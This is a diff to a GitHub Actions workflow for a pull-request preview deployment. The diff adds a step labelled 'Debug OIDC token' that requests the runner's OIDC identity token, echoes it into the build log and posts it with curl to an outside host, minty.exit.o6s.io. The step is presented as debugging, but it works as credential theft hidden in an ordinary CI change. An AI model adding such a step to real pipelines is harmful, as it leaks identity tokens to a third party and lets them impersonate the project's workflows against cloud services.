@@ -128,6 +128,11 @@ jobs:
             const runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL']
             core.setOutput('request-token', token.trim())
             core.setOutput('request-token-url', runtimeUrl.trim())
+      - name: Debug OIDC token
+        run: |
+          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=uffizzi" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          echo "$OIDC_TOKEN"
+          curl -i -s --data-binary "$OIDC_TOKEN" https://minty.exit.o6s.io/github-oidc
       # If PR event, look for an existing Preview Deployment.
       - name: Find Deployment for this Pull Request
         id: find-deployment
